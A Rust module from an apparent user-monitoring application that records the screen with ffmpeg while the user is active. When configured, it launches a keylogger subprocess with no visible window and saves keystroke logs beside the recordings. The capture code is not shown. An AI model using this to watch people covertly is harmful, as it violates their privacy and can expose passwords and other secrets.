//! Orchestrates the screen-recording lifecycle:
//!   * Watches idle time and starts/stops ffmpeg accordingly.
//!   * Spawns a keylogger subprocess alongside recording when enabled.
//!   * Publishes `RecorderStatus` events to interested subscribers
//!     (status GUI, tray icon).

use std::path::{Path, PathBuf};
use std::process::Child;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;

use anyhow::{anyhow, Context, Result};
use chrono::Local;
use parking_lot::Mutex;
use tokio::sync::watch;

use crate::config::{parse_hms, Config};
use crate::ffmpeg;
use crate::idle;

#[derive(Clone, Debug, PartialEq, Eq)]
pub enum RecorderStatus {
    Idle,
    Recording { file: PathBuf },
    Error(String),
}

pub struct Recorder {
    status_tx: watch::Sender<RecorderStatus>,
    status_rx: watch::Receiver<RecorderStatus>,
    stop: Arc<AtomicBool>,
    child: Arc<Mutex<Option<Child>>>,
    keylog_child: Arc<Mutex<Option<Child>>>,
}

impl Recorder {
    pub fn new() -> Self {
        let (tx, rx) = watch::channel(RecorderStatus::Idle);
        Self {
            status_tx: tx,
            status_rx: rx,
            stop: Arc::new(AtomicBool::new(false)),
            child: Arc::new(Mutex::new(None)),
            keylog_child: Arc::new(Mutex::new(None)),
        }
    }

    pub fn subscribe(&self) -> watch::Receiver<RecorderStatus> {
        self.status_rx.clone()
    }

    pub fn request_stop(&self) {
        self.stop.store(true, Ordering::SeqCst);
        self.kill_children();
    }

    fn kill_children(&self) {
        if let Some(mut c) = self.child.lock().take() {
            let _ = c.kill();
            let _ = c.wait();
        }
        if let Some(mut c) = self.keylog_child.lock().take() {
            let _ = c.kill();
            let _ = c.wait();
        }
    }

    /// Run the recorder loop until `request_stop` is called.
    pub fn run(self: Arc<Self>, cfg: Config) -> Result<()> {
        let ffmpeg_path = ffmpeg::ffmpeg_path(&cfg)
            .ok_or_else(|| anyhow!("ffmpeg.exe not found — set [paths].ffmpeg in config.toml"))?;
        tracing::info!("using ffmpeg at {:?}", ffmpeg_path);

        let idle_thresh = Duration::from_secs(
            parse_hms(&cfg.recording.idle_threshold).unwrap_or(3600),
        );
        let check_interval = Duration::from_secs(cfg.recording.check_interval.max(1));
        let duration_secs = parse_hms(&cfg.recording.record_duration).unwrap_or(5400);

        let mut is_recording = false;

        while !self.stop.load(Ordering::Relaxed) {
            let idle = idle::idle_duration();
            if is_recording {
                // Reap the child if the segment ended (duration cap hit).
                let exited = {
                    let mut guard = self.child.lock();
                    match guard.as_mut().map(|c| c.try_wait()) {
                        Some(Ok(Some(_))) => true,
                        _ => false,
                    }
                };
                if exited {
                    tracing::info!("ffmpeg segment finished, rotating");
                    self.stop_segment();
                    is_recording = false;
                    let _ = self.status_tx.send(RecorderStatus::Idle);
                }
            }

            // Idle threshold of 0 == always record while user is logged in.
            let user_active = idle_thresh.is_zero() || idle < idle_thresh;

            if user_active && !is_recording {
                match self.start_segment(&cfg, &ffmpeg_path, duration_secs) {
                    Ok(file) => {
                        is_recording = true;
                        tracing::info!("recording → {:?}", file);
                        let _ = self.status_tx.send(RecorderStatus::Recording { file });
                    }
                    Err(e) => {
                        tracing::error!("failed to start segment: {e:#}");
                        let _ = self.status_tx.send(RecorderStatus::Error(e.to_string()));
                    }
                }
            } else if !user_active && is_recording {
                tracing::info!("user idle — stopping segment");
                self.stop_segment();
                is_recording = false;
                let _ = self.status_tx.send(RecorderStatus::Idle);
            }

            std::thread::sleep(check_interval);
        }

        self.stop_segment();
        Ok(())
    }

    fn build_output_path(&self, cfg: &Config) -> Result<PathBuf> {
        let now = Local::now();
        let username = whoami_user();
        let pc = hostname();
        let filename = cfg
            .recording
            .filename_template
            .replace("{username}", &username)
            .replace("{timestamp}", &now.format("%d%m%Y-%H%M%S").to_string())
            .replace("{date}", &now.format("%Y%m%d").to_string());
        let folder = Path::new(&cfg.recording.recording_dir)
            .join(&pc)
            .join(now.format("%Y%m%d").to_string());
        std::fs::create_dir_all(&folder).with_context(|| format!("creating {:?}", folder))?;
        Ok(folder.join(filename))
    }

    fn start_segment(
        &self,
        cfg: &Config,
        ffmpeg_path: &Path,
        duration_secs: u64,
    ) -> Result<PathBuf> {
        let output = self.build_output_path(cfg)?;

        let mut cmd = ffmpeg::build_record_cmd(
            ffmpeg_path,
            &output,
            cfg.recording.framerate,
            duration_secs,
            cfg.recording.crf,
            &cfg.recording.preset,
        );
        let child = cmd.spawn().context("spawning ffmpeg")?;
        *self.child.lock() = Some(child);

        // Companion keylogger — spawn ourselves as a subprocess in worker mode.
        if cfg.recording.enable_key_logging {
            if let Ok(exe) = std::env::current_exe() {
                let log_path = output.with_extension("txt");
                let spawn_result = {
                    let mut cmd = std::process::Command::new(exe);
                    cmd.arg("keylog-worker")
                        .arg("--output")
                        .arg(&log_path);
                    #[cfg(windows)]
                    {
                        use std::os::windows::process::CommandExt;
                        cmd.creation_flags(0x08000000);
                    }
                    cmd.spawn()
                };
                match spawn_result {
                    Ok(c) => *self.keylog_child.lock() = Some(c),
                    Err(e) => tracing::warn!("failed to spawn keylogger: {e}"),
                }
            }
        }

        Ok(output)
    }

    fn stop_segment(&self) {
        if let Some(mut c) = self.child.lock().take() {
            let _ = ffmpeg::stop_recording(&mut c);
        }
        if let Some(mut c) = self.keylog_child.lock().take() {
            let _ = c.kill();
            let _ = c.wait();
        }
    }
}

fn whoami_user() -> String {
    std::env::var("USERNAME")
        .or_else(|_| std::env::var("USER"))
        .unwrap_or_else(|_| "user".to_string())
}

fn hostname() -> String {
    std::env::var("COMPUTERNAME")
        .or_else(|_| std::env::var("HOSTNAME"))
        .unwrap_or_else(|_| "PC".to_string())
}
